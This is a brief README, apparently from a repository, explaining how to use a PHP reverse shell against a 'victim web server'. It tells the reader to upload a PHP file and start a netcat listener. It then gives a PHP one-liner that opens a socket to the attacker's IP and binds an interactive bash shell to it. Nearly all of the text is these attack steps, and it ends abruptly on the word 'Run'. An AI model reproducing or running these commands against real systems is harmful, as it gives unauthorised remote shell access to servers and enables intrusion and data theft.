# phpReverseshell
Note: 1. This is PHP based reverse shell 
      2. shell_exec() should be enables at server side (Victim web server)
Upload the 9090909090101010101010.php into webserver.
At attacker side run "nc -lvp $ATTACKER_PORT" (ex: nc -lvp 1234).
Then access http://server_IP/location_of_9090909090101010101010.php.
and input php -r '$sock=fsockopen("$Attacker_IP",$ATTACKER_PORT);exec("/bin/bash -i <&3 >&3 2>&3");' and hit Run.
Reverse shell will be created at attacker side.
Run 
